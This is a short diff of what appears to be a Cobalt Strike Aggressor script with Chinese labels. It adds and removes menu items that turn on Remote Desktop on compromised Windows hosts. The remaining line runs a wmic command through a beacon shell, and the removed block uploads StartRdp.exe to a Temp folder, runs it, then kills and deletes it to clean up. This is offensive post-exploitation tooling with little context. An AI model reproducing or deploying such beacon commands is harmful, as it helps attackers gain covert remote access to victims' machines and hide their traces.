@@ -31,33 +31,6 @@ menu "☆ RDP相关" {
             bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
         }
 
-        menu "WinAPI" {
-            item "上传StartRdp" {
-            blog($1, "\c9=========== 上传StartRdp ==========");
-                $bid = $1;
-                $dialog = dialog("上传 StartRdp.exe", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &open-3389);
-                dialog_description($dialog, "使用 WindowsAPI 开启 RDP");
-                drow_text($dialog, "UploadPath",  "上传路径: ");
-                dbutton_action($dialog, "上传");
-                dialog_show($dialog);
-                }
-                sub open-3389{
-                bcd($bid, $3['UploadPath']);
-                bupload($bid, script_resource("scripts/RemoteLogin/StartRdp.exe"));
-            }
-            item "运行 StartRdp" {
-            blog($1, "\c9=========== 运行 StartRdp ==========");
-                bshell($bid, "StartRdp.exe");
-            }
-            item "删除 StartRdp" {
-            blog($1, "\c9=========== 删除 StartRdp ==========");
-                local('$bid');
-                foreach $bid ($1){
-                    bshell($1, "taskkill -f /im StartRdp.exe & del /f /s /q StartRdp.exe");
-                    bshell($bid, "del C:\\Windows\\Temp\\StartRdp.exe");
-                }
-            }
-        }
     }    
     menu "关闭 RDP 服务" {
         item "Powershell" {
